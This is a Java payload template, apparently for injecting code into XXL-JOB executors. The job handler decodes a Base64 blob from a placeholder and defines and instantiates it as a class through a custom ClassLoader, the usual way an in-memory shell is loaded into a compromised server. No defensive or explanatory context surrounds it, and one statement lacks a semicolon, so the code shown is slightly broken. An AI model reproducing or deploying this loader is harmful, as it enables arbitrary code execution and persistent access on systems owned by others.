import com.xxl.job.core.biz.model.ReturnT;
import com.xxl.job.core.handler.IJobHandler;

import java.util.Base64;

public class DemoGlueJobHandler extends IJobHandler {

    public static class Definder extends ClassLoader {
        public Definder() {
            super(Thread.currentThread().getContextClassLoader());
        }

        public Class<?> defineClass(byte[] bytes) {
            return defineClass(null, bytes, 0, bytes.length);
        }
    }

    public void execute() throws Exception {
        execute(null)
    }

    public ReturnT<String> execute(String param) throws Exception {
        String base64Str = "{{base64Str}}";
        String className = "{{className}}";
        try {
            Class.forName(className);
        } catch (ClassNotFoundException e) {
            try {
                new Definder().defineClass(Base64.getDecoder().decode(base64Str)).newInstance();
            } catch (Throwable ee) {
                ee.printStackTrace();
            }
        }
        return ReturnT.SUCCESS;
    }
}
